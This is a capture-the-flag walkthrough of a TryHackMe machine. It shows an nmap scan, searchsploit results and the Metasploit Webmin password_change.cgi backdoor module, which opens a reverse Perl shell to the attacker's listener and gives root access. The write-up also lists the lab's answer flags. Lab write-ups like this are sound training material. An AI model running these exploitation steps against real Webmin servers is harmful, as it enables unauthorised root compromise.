Swatish Attaluri
Date: 21-06-2021
## Source - Tryhackme
### Machine IP: 10.10.229.160
#### Nmap scan
```bash
$ nmap -sC -sV -oN ports 10.10.229.160    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-22 12:50 IST
Nmap scan report for 10.10.229.160
Host is up (0.20s latency).
Not shown: 992 closed ports
PORT      STATE    SERVICE   VERSION
9/tcp     filtered discard
22/tcp    open     ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
2191/tcp  filtered tvbus
3372/tcp  filtered msdtc
8021/tcp  filtered ftp-proxy
8443/tcp  filtered https-alt
10000/tcp open     http      MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
19842/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.23 seconds
```
We find something on port 10000 called MiniServ and Webmin.
Seachsploit didnt show any results for MiniServ so i have searched for Webmin in searchsploit.
Also browsing the webpage on port 10000 while using https shows a login form.
```bash
$ searchsploit Webmin  
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                          | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                         | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                     | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                 | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                        | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                              | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                  | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                       | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                             | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                       | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                    | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                  | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                     | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                   | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                     | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                        | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                          | linux/webapps/49318.rb
Webmin 1.x - HTML Email Command Execution                                                | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                             | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                             | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                            | linux/webapps/47330.rb
----------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
There are many of them so i instead searched in metasploit.
```bash
msf6 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   3  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   4  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   5  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor


Interact with a module by name or index. For example info 5, use 5 or use exploit/linux/http/webmin_backdoor
```
We see a backdoor in password_change which is very releatable to the login page on port 10000.
Lets use this exploit.
```bash
msf6 > use 5
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(linux/http/webmin_backdoor) > show options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path
                                         >'
   RPORT      10000            yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the
                                          local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)
```
```bash
msf6 exploit(linux/http/webmin_backdoor) > set lhost 10.17.6.214
lhost => 10.17.6.214
msf6 exploit(linux/http/webmin_backdoor) > set rhosts 10.10.229.160
rhosts => 10.10.229.160
msf6 exploit(linux/http/webmin_backdoor) > exploit

[*] Started reverse TCP handler on 10.17.6.214:4444 
[*] Executing automatic check (disable AutoCheck to override)
[-] Please enable the SSL option to proceed
[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. Enable ForceExploit to override check result.
[*] Exploit completed, but no session was created.
```
It says to enable to ssl option set to true.
```bash
msf6 exploit(linux/http/webmin_backdoor) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
```
Running exploit
```bash
msf6 exploit(linux/http/webmin_backdoor) > exploit 

[*] Started reverse TCP handler on 10.17.6.214:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.17.6.214:4444 -> 10.10.229.160:57176) at 2021-06-22 13:04:04 +0530

whoami
root
ls /home
dark
cat /home/dark/user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
cat /root/root.txt
THM{UPDATE_YOUR_INSTALL}
```
We got a privileged shell, we can access the files directly.
#### Answers
``` 
user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
root.txt
THM{UPDATE_YOUR_INSTALL}
```

#metasploit